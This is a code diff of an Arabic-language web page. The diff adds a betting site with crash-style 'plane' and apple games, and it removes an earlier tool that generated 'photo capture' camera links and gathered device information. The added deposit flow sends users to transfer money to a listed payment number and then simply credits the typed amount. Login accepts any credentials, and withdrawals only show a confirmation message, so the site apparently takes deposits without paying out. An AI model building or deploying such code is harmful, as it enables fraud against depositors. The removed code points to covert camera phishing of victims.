+                    countdown.textContent = '';
+                    startPlaneGame();
+                }
+            }, 1000);
+        }
+        
+        // Start plane game
+        function startPlaneGame() {
+            currentMultiplier = 0.0;
+            planeExploded = false;
+            multiplierDisplay.textContent = '0.0x';
+            plane.style.display = 'block';
+            explosion.style.display = 'none';
+            planeGameResult.style.display = 'none';
+            jumpBtn.disabled = false;
+            
+            // Generate random explosion multiplier between 1.0 and 20.0
+            explosionMultiplier = parseFloat((1 + Math.random() * 19).toFixed(1));
+            currentMultiplierDisplay.textContent = `${explosionMultiplier}x`;
+            
+            // Position plane at start
+            plane.style.left = '-100px';
+            
+            // Start plane animation
+            let planePosition = -100;
+            const planeAnimation = setInterval(() => {
+                planePosition += 2;
+                plane.style.left = `${planePosition}px`;
+                
+                if (planePosition > window.innerWidth + 100 || planeExploded) {
+                    clearInterval(planeAnimation);
+                }
+            }, 50);
+            
+            // Start multiplier increase
+            planeGameInterval = setInterval(() => {
+                if (planeExploded) {
+                    clearInterval(planeAnimation);
+                    return;
+                }
+                
+                // Increase multiplier
+                const increase = 0.1;
+                currentMultiplier = parseFloat((currentMultiplier + increase).toFixed(1));
+                multiplierDisplay.textContent = `${currentMultiplier}x`;
+                
+                // Check for explosion
+                if (currentMultiplier >= explosionMultiplier) {
+                    explodePlane();
+                    clearInterval(planeAnimation);
+                }
+            }, 100);
+        }
+        
+        // Plane explosion
+        function explodePlane() {
+            planeExploded = true;
+            clearInterval(planeGameInterval);
+            plane.style.display = 'none';
+            explosion.style.display = 'block';
+            
+            // Player loses if they didn't jump
+            if (!jumpBtn.disabled) {
+                balance -= planeBet;
+                updateBalance();
+                planeGameResult.textContent = `انفجرت الطيارة عند ${explosionMultiplier}x! خسرت ${planeBet} جنيه`;
+                planeGameResult.className = 'game-result lose';
+                planeGameResult.style.display = 'block';
+                planeGameActive = false;
+                
+                // Show error toast
+                showToast(`انفجرت الطيارة! خسرت ${planeBet} جنيه`, 'error');
+            }
+        }
+        
+        // Jump button handler
+        function handleJump() {
+            if (planeExploded || !planeGameActive) return;
+            
+            clearInterval(planeGameInterval);
+            planeExploded = true;
+            jumpBtn.disabled = true;
+            planeGameActive = false;
+            
+            // Calculate winnings
+            const winnings = Math.floor(planeBet * selectedMultiplier);
+            balance += winnings;
+            updateBalance();
+            
+            planeGameResult.textContent = `مبروك! ربحت ${winnings} جنيه (${selectedMultiplier}x)`;
+            planeGameResult.className = 'game-result win';
+            planeGameResult.style.display = 'block';
+            
+            // Show success toast
+            showToast(`مبروك! ربحت ${winnings} جنيه`, 'success');
+        }
+        
+        // Update balance display
+        function updateBalance() {
+            balanceDisplay.textContent = balance;
+            planeGameBalance.textContent = balance;
+            appleGameBalance.textContent = balance;
+            availableBalance.textContent = balance;
+            
+            // Update user balance in storage
+            if (currentUser) {
+                users[currentUser].balance = balance;
+            }
+        }
+        
+        // Copy payment number to clipboard
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('تم نسخ رقم التحويل', 'success');
+            }).catch(err => {
+                showToast('فشل نسخ الرقم', 'error');
+                console.error('Failed to copy: ', err);
+            });
+        }
+        
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', () => {
+            createParticles();
+        });
+        
+        // Switch between login and register forms
+        showRegister.addEventListener('click', () => {
+            loginForm.style.display = 'none';
+            registerForm.style.display = 'block';
+        });
+        
+        showLogin.addEventListener('click', () => {
+            registerForm.style.display = 'none';
+            loginForm.style.display = 'block';
+        });
+        
+        // Register new account
+        registerBtn.addEventListener('click', () => {
+            const phone = registerPhone.value.trim();
+            const password = registerPassword.value.trim();
+            const confirm = confirmPassword.value.trim();
+            
+            if (!phone || !password || !confirm) {
+                showToast('الرجاء ملء جميع الحقول', 'error');
+                return;
+            }
+            
+            if (password !== confirm) {
+                showToast('كلمة المرور غير متطابقة', 'error');
+                return;
+            }
+            
+            if (phone.length !== 11 || !phone.startsWith('01')) {
+                showToast('رقم الهاتف غير صحيح', 'error');
+                return;
+            }
+            
+            if (users[phone]) {
+                showToast('هذا الرقم مسجل بالفعل', 'error');
+                return;
+            }
+            
+            // Create new user with 0 balance
+            users[phone] = {
+                phone,
+                password,
+                balance: 0
+            };
+            
+            showToast('تم إنشاء الحساب بنجاح، يمكنك الآن تسجيل الدخول', 'success');
+            registerForm.style.display = 'none';
+            loginForm.style.display = 'block';
+            registerPhone.value = '';
+            registerPassword.value = '';
+            confirmPassword.value = '';
+        });
+        
+        // Login to account
+        loginBtn.addEventListener('click', () => {
+            const phone = loginPhone.value.trim();
+            const password = loginPassword.value.trim();
+            
+            if (!phone || !password) {
+                showToast('الرجاء إدخال رقم الهاتف وكلمة المرور', 'error');
+                return;
+            }
+            
+            // Allow login with any credentials
+            loginPage.style.display = 'none';
+            appContainer.style.display = 'flex';
+            mainContent.style.display = 'block';
+            
+            // Set user data
+            currentUser = phone;
+            if (!users[phone]) {
+                users[phone] = {
+                    phone,
+                    password,
+                    balance: 0
+                };
+            }
+            usernameDisplay.textContent = phone;
+            welcomeUsername.textContent = phone;
+            userAvatar.textContent = phone.charAt(0);
+            balance = users[phone].balance;
+            updateBalance();
+            
+            // Show welcome toast
+            showToast(`مرحباً بك ${phone}`, 'success');
+        });
+        
+        // Deposit button
+        depositBtn.addEventListener('click', () => {
+            depositModal.style.display = 'flex';
+            setTimeout(() => {
+                depositModal.classList.add('show');
+            }, 10);
+        });
+        
+        // Withdraw button
+        withdrawBtn.addEventListener('click', () => {
+            if (balance < 200) {
+                showToast('الحد الأدنى للسحب هو 200 جنيه', 'error');
+                return;
+            }
+            withdrawModal.style.display = 'flex';
+            setTimeout(() => {
+                withdrawModal.classList.add('show');
+            }, 10);
+        });
+        
+        // Payment method selection
+        paymentMethods.forEach(method => {
+            method.addEventListener('click', () => {
+                paymentMethods.forEach(m => m.classList.remove('selected'));
+                method.classList.add('selected');
+                selectedPaymentMethod = method.dataset.method;
+                
+                // Show payment info
+                if (method.closest('#depositModal')) {
+                    paymentInfo.style.display = 'block';
+                    paymentNumber.textContent = paymentData[selectedPaymentMethod].number;
+                } else {
+                    withdrawInfo.style.display = 'block';
+                }
+            });
+        });
+        
+        // Copy payment number
+        copyPaymentNumber.addEventListener('click', () => {
+            if (selectedPaymentMethod) {
+                copyToClipboard(paymentData[selectedPaymentMethod].number);
+            }
+        });
+        
+        // Add balance
+        addBalanceBtn.addEventListener('click', () => {
+            if (!selectedPaymentMethod) {
+                showToast('الرجاء اختيار وسيلة الدفع', 'error');
+                return;
+            }
+            
+            const amount = parseInt(depositAmount.value.trim());
+            const phone = depositPhone.value.trim();
+            
+            if (isNaN(amount)) {
+                showToast('الرجاء إدخال مبلغ صحيح', 'error');
+                return;
+            }
+            
+            const minAmount = paymentData[selectedPaymentMethod].minAmount;
+            if (amount < minAmount) {
+                showToast(`الحد الأدنى للإيداع هو ${minAmount} جنيه`, 'error');
+                return;
+            }
+            
+            if (!phone || phone.length !== 11 || !phone.startsWith('01')) {
+                showToast('الرجاء إدخال رقم هاتف صحيح', 'error');
+                return;
+            }
+            
+            // Show loading state
+            addBalanceText.textContent = 'جاري الإيداع...';
+            depositSpinner.style.display = 'inline-block';
+            addBalanceBtn.disabled = true;
+            
+            // Show processing message
+            showProcessingMessage(
+                'جاري معالجة طلب الإيداع',
+                'يرجى الانتظار حتى نتحقق من العملية'
+            );
+            
+            // Simulate deposit processing (5 seconds)
+            setTimeout(() => {
+                balance += amount;
+                updateBalance();
+                
+                // Hide modal and reset
+                depositModal.classList.remove('show');
+                setTimeout(() => {
+                    depositModal.style.display = 'none';
+                }, 300);
+                
+                depositAmount.value = '';
+                paymentMethods.forEach(m => m.classList.remove('selected'));
+                paymentInfo.style.display = 'none';
+                selectedPaymentMethod = null;
+                
+                // Reset button state
+                addBalanceText.textContent = 'إضافة الرصيد';
+                depositSpinner.style.display = 'none';
+                addBalanceBtn.disabled = false;
+                
+                // Hide processing message
+                hideProcessingMessage();
+                
+                // Show success message
+                showToast(`تم إيداع ${amount} جنيه بنجاح`, 'success');
             }, 5000);
-        }
-        
-        // تنسيق الأرقام بإضافة فواصل
-        function formatNumber(num) {
-            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
-        }
-        
-        // إنشاء رابط التقاط الصور
-        document.getElementById('generateLink').addEventListener('click', function() {
-            const linkContainer = document.getElementById('generatedLinkContainer');
-            const generatedLink = document.getElementById('generatedLink');
-            
-            // إنشاء معرف فريد للرابط
-            const linkId = 'camera_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            const linkHref = `camera.html?id=${linkId}`;
-            
-            generatedLink.href = linkHref;
-            generatedLink.textContent = window.location.origin + '/' + linkHref;
-            
-            linkContainer.style.display = 'block';
-            
-            // زيادة عدد الروابط المستخرجة
-            const totalLinks = document.getElementById('totalLinks');
-            totalLinks.textContent = formatNumber(parseInt(totalLinks.textContent.replace(',', '')) + 1);
         });
         
-        // عرض الصور الملتقطة
-        document.getElementById('showPhotosBtn').addEventListener('click', function() {
-            const capturedPhotos = document.getElementById('capturedPhotos');
-            const photosGrid = document.getElementById('photosGrid');
+        // Withdraw balance
+        withdrawBalanceBtn.addEventListener('click', () => {
+            const amount = parseInt(withdrawAmount.value);
+            const phone = withdrawPhone.value.trim();
             
-            // مسح الصور الحالية
-            photosGrid.innerHTML = '';
-            
-            // محاكاة صور ملتقطة (في تطبيق حقيقي، سيتم جلبها من قاعدة البيانات)
-            const samplePhotos = 6;
-            
-            for (let i = 0; i < samplePhotos; i++) {
-                const photoItem = document.createElement('img');
-                photoItem.classList.add('photo-item');
-                photoItem.src = `https://picsum.photos/200/200?random=${i}`;
-                photoItem.alt = `صورة ملتقطة ${i+1}`;
-                
-                photosGrid.appendChild(photoItem);
+            if (!selectedPaymentMethod) {
+                showToast('الرجاء اختيار وسيلة السحب', 'error');
+                return;
             }
             
-            capturedPhotos.style.display = 'block';
+            if (isNaN(amount)) {
+                showToast('الرجاء إدخال مبلغ صحيح', 'error');
+                return;
+            }
+            
+            if (amount < 200) {
+                showToast('الحد الأدنى للسحب هو 200 جنيه', 'error');
+                return;
+            }
+            
+            if (amount > balance) {
+                showToast('لا يوجد رصيد كافي', 'error');
+                return;
+            }
+            
+            if (!phone || phone.length !== 11 || !phone.startsWith('01')) {
+                showToast('الرجاء إدخال رقم هاتف صحيح', 'error');
+                return;
+            }
+            
+            // Show loading state
+            withdrawBalanceText.textContent = 'جاري السحب...';
+            withdrawSpinner.style.display = 'inline-block';
+            withdrawBalanceBtn.disabled = true;
+            
+            // Show processing message
+            showProcessingMessage(
+                'جاري معالجة طلب السحب',
+                'يرجى الانتظار حتى نتحقق من العملية'
+            );
+            
+            // Simulate withdrawal processing
+            setTimeout(() => {
+                balance -= amount;
+                updateBalance();
+                
+                // Hide modal and reset
+                withdrawModal.classList.remove('show');
+                setTimeout(() => {
+                    withdrawModal.style.display = 'none';
+                }, 300);
+                
+                withdrawAmount.value = '';
+                withdrawPhone.value = '';
+                paymentMethods.forEach(m => m.classList.remove('selected'));
+                withdrawInfo.style.display = 'none';
+                selectedPaymentMethod = null;
+                
+                // Reset button state
+                withdrawBalanceText.textContent = 'طلب السحب';
+                withdrawSpinner.style.display = 'none';
+                withdrawBalanceBtn.disabled = false;
+                
+                // Hide processing message
+                hideProcessingMessage();
+                
+                // Show success message
+                showToast(`تم تقديم طلب سحب ${amount} جنيه إلى ${paymentData[selectedPaymentMethod].name} رقم ${phone}`, 'success');
+            }, 5000);
         });
         
-        // تهيئة الصفحة عند التحميل
-        document.addEventListener('DOMContentLoaded', function() {
-            createBloodEffect();
-            gatherDeviceInfo();
-            updateStats();
+        // Close modals
+        closeDepositModal.addEventListener('click', () => {
+            depositModal.classList.remove('show');
+            setTimeout(() => {
+                depositModal.style.display = 'none';
+            }, 300);
+            depositAmount.value = '';
+            paymentMethods.forEach(m => m.classList.remove('selected'));
+            paymentInfo.style.display = 'none';
+            selectedPaymentMethod = null;
+        });
+        
+        closeWithdrawModal.addEventListener('click', () => {
+            withdrawModal.classList.remove('show');
+            setTimeout(() => {
+                withdrawModal.style.display = 'none';
+            }, 300);
+            withdrawAmount.value = '';
+            withdrawPhone.value = '';
+            paymentMethods.forEach(m => m.classList.remove('selected'));
+            withdrawInfo.style.display = 'none';
+            selectedPaymentMethod = null;
+        });
+        
+        // Start plane game
+        planeGameCard.addEventListener('click', () => {
+            mainContent.style.display = 'none';
+            planeGame.style.display = 'block';
+            planeBetAmount.value = '';
+            multiplierBoxes.forEach(box => box.classList.remove('selected'));
+            explosionInfo.style.display = 'none';
+            planeGameResult.style.display = 'none';
+            selectedMultiplier = 0;
+        });
+        
+        // Start apple game
+        appleGameCard.addEventListener('click', () => {
+            mainContent.style.display = 'none';
+            appleGame.style.display = 'block';
+            appleBetAmount.value = '';
+            appleGameResult.style.display = 'none';
+        });
+        
+        // Select multiplier for plane game
+        multiplierBoxes.forEach(box => {
+            box.addEventListener('click', () => {
+                if (planeGameActive) return;
+                
+                multiplierBoxes.forEach(b => b.classList.remove('selected'));
+                box.classList.add('selected');
+                selectedMultiplier = parseFloat(box.dataset.multiplier);
+            });
+        });
+        
+        // Set plane bet amount
+        startPlaneGameBtn.addEventListener('click', () => {
+            const bet = parseInt(planeBetAmount.value);
+            
+            if (isNaN(bet)) {
+                showToast('الرجاء إدخال مبلغ الرهان', 'error');
+                return;
+            }
+            
+            if (bet < 10) {
+                showToast('الحد الأدنى للرهان هو 10 جنيه', 'error');
+                return;
+            }
+            
+            if (bet > balance) {
+                showToast('لا يوجد رصيد كافي', 'error');
+                return;
+            }
+            
+            if (selectedMultiplier === 0) {
+                showToast('الرجاء اختيار مضاعف', 'error');
+                return;
+            }
+            
+            planeBet = bet;
+            planeGameActive = true;
+            explosionInfo.style.display = 'block';
+            startPlaneCountdown();
+        });
+        
+        // Set apple bet amount
+        startAppleGameBtn.addEventListener('click', () => {
+            const bet = parseInt(appleBetAmount.value);
+            
+            if (isNaN(bet)) {
+                showToast('الرجاء إدخال مبلغ الرهان', 'error');
+                return;
+            }
+            
+            if (bet < 10) {
+                showToast('الحد الأدنى للرهان هو 10 جنيه', 'error');
+                return;
+            }
+            
+            if (bet > balance) {
+                showToast('لا يوجد رصيد كافي', 'error');
+                return;
+            }
+            
+            appleBet = bet;
+            appleGameActive = true;
+            initAppleGame();
+        });
+        
+        // Cashout button
+        cashoutBtn.addEventListener('click', cashoutPrize);
+        
+        jumpBtn.addEventListener('click', handleJump);
+        
+        // Back buttons
+        backFromPlaneBtn.addEventListener('click', () => {
+            clearInterval(planeGameInterval);
+            clearInterval(countdownInterval);
+            planeGame.style.display = 'none';
+            mainContent.style.display = 'block';
+            planeGameActive = false;
+        });
+        
+        backFromAppleBtn.addEventListener('click', () => {
+            appleGame.style.display = 'none';
+            mainContent.style.display = 'block';
+            appleGameActive = false;
+        });
+        
+        // Close modals when clicking outside
+        window.addEventListener('click', (e) => {
+            if (e.target === depositModal) {
+                closeDepositModal.click();
+            }
+            if (e.target === withdrawModal) {
+                closeWithdrawModal.click();
+            }
         });
     </script>
 </body>
